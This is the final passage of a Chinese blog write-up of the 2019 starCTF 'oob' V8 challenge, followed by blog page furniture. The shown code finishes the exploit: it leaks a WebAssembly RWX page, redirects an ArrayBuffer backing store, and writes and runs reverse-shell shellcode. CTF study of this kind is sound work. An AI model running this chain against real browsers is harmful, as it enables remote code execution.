class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> f_addr = <span class="title function_">addressOf</span>(f);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak wasm func addr: 0x&quot;</span> + <span class="title function_">hex</span>(f_addr));</span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shared_info_addr = <span class="title function_">read64</span>(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = <span class="title function_">read64</span>(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = <span class="title function_">read64</span>(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = <span class="title function_">read64</span>(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] leak rwx_page_addr: 0x&quot;</span> + <span class="title function_">hex</span>(rwx_page_addr));</span><br><span class="line"></span><br><span class="line"><span class="comment">//%DebugPrint(f);</span></span><br><span class="line"><span class="comment">//%SystemBreak();</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* /bin/sh for linux x64</span></span><br><span class="line"><span class="comment"> char shellcode[] = &quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53 \x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;;</span></span><br><span class="line"><span class="comment">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">/*var shellcode = [</span></span><br><span class="line"><span class="comment">    0x2fbb485299583b6an,</span></span><br><span class="line"><span class="comment">    0x5368732f6e69622fn,</span></span><br><span class="line"><span class="comment">    0x050f5e5457525f54n</span></span><br><span class="line"><span class="comment">];*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line"><span class="number">0x6a5f026a9958296an</span>,</span><br><span class="line"><span class="number">0xb9489748050f5e01n</span>,</span><br><span class="line"><span class="number">0x100007f3d0d0002n</span>,</span><br><span class="line"><span class="number">0x6a5a106ae6894851n</span>,</span><br><span class="line"><span class="number">0x485e036a050f582an</span>,</span><br><span class="line"><span class="number">0x75050f58216aceffn</span>,</span><br><span class="line"><span class="number">0x2fbb4899583b6af6n</span>,</span><br><span class="line"><span class="number">0x530068732f6e6962n</span>,</span><br><span class="line"><span class="number">0xe689485752e78948n</span>,</span><br><span class="line"><span class="number">0x909090909090050fn</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span>*<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = <span class="title function_">addressOf</span>(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">write64</span>(buf_backing_store_addr, rwx_page_addr);  <span class="comment">//这里写入之前泄露的rwx_page_addr地址</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;shellcode length: &quot;</span> + <span class="title function_">hex</span>(shellcode.<span class="property">length</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;now i: &quot;</span> + <span class="title function_">hex</span>(i));</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">8</span>*i, shellcode[i], <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" rel="external nofollow noreferrer">LYYL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.lyyl.online/posts/1029211104.html">https://www.lyyl.online/posts/1029211104.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="external nofollow noreferrer" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.lyyl.online" target="_blank">LYYL' Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/1864456601.html"><img class="prev-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2021 0CTF/TCTF Final Naive Heap</div></div></a></div><div class="next-post pull-right"><a href="/posts/95726211.html"><img class="next-cover" src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">AFL源码及流程分析</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/favicon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">LYYL</div><div class="author-info__description">毋忧拂意，毋喜快心，毋恃久安，毋惮初难。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/liuzhongchina521"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/liuzhongchina521" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:liuzhongchina521@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">博客内容为Notion导出markdown，如有错误敬请谅解。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91V8"><span class="toc-text">编译V8</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E8%AF%95V8"><span class="toc-text">调试V8</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#V8%E5%AF%B9%E8%B1%A1%E7%BB%93%E6%9E%84"><span class="toc-text">V8对象结构</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99addressOf%E5%92%8CfakeObject"><span class="toc-text">编写addressOf和fakeObject</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%BB%BB%E6%84%8F%E5%86%85%E5%AD%98%E8%AF%BB%E5%86%99"><span class="toc-text">获取任意内存读写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Getshell"><span class="toc-text">Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%A0%E7%BB%9F%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">传统的堆利用思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%9A%8F%E6%9C%BA%E6%B3%84%E9%9C%B2"><span class="toc-text">随机泄露</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%A8%B3%E5%AE%9A%E6%B3%84%E9%9C%B2"><span class="toc-text">稳定泄露</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wasm-Getshell"><span class="toc-text">wasm Getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">反弹shell</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/95726211.html" title="AFL源码及流程分析"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-3.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AFL源码及流程分析"/></a><div class="content"><a class="title" href="/posts/95726211.html" title="AFL源码及流程分析">AFL源码及流程分析</a><time datetime="2022-05-26T07:20:45.000Z" title="发表于 2022-05-26 15:20:45">2022-05-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-37.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="V8 重新入门-2019 starCTF oob 题解"/></a><div class="content"><a class="title" href="/posts/1029211104.html" title="V8 重新入门-2019 starCTF oob 题解">V8 重新入门-2019 starCTF oob 题解</a><time datetime="2021-11-05T14:20:21.000Z" title="发表于 2021-11-05 22:20:21">2021-11-05</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-57.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 0CTF/TCTF Final Naive Heap"/></a><div class="content"><a class="title" href="/posts/1864456601.html" title="2021 0CTF/TCTF Final Naive Heap">2021 0CTF/TCTF Final Naive Heap</a><time datetime="2021-09-29T02:18:50.000Z" title="发表于 2021-09-29 10:18:50">2021-09-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-17.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="虚拟机逃逸&amp;漏洞复现"/></a><div class="content"><a class="title" href="/posts/2427305175.html" title="虚拟机逃逸&amp;漏洞复现">虚拟机逃逸&amp;漏洞复现</a><time datetime="2021-08-18T05:34:33.000Z" title="发表于 2021-08-18 13:34:33">2021-08-18</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP"><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/bg/bg-32.jpeg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2021 XCTF Final 线下WP"/></a><div class="content"><a class="title" href="/posts/3705072996.html" title="2021 XCTF Final 线下WP">2021 XCTF Final 线下WP</a><time datetime="2021-07-30T07:26:18.000Z" title="发表于 2021-07-30 15:26:18">2021-07-30</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By LYYL</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://www.lyyl.online/posts/1029211104.html'
    this.page.identifier = 'posts/1029211104.html'
    this.page.title = 'V8 重新入门-2019 starCTF oob 题解'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://lyyl-online.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }
}

if ('Disqus' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>